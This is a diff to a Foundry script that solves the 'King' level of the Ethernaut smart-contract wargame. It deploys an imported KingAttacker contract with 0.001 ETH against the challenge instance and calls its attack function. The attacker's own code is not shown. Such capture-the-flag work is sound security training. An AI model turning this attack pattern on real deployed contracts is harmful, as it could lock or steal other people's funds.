@@ -5,6 +5,7 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
+import "../../src/09-KingAttacker.sol";
 
 contract KingSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0x3049C00639E6dfC269ED1451764a046f7aE500c6;
@@ -13,11 +14,12 @@ contract KingSolution is Script, EthernautHelper {
     function run() public {
         vm.startBroadcast(heroPrivateKey);
         // NOTE this is the address of your challenge contract
-        address challengeInstance = createInstance(LEVEL_ADDRESS);
+        // NOTE Must send at least 0.001 ETH
+        address challengeInstance = __createInstance(LEVEL_ADDRESS);
 
         // YOUR SOLUTION HERE
-
-
+        KingAttacker kingAttacker = new KingAttacker{value:0.001 ether}(challengeInstance);
+        kingAttacker.attack();
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
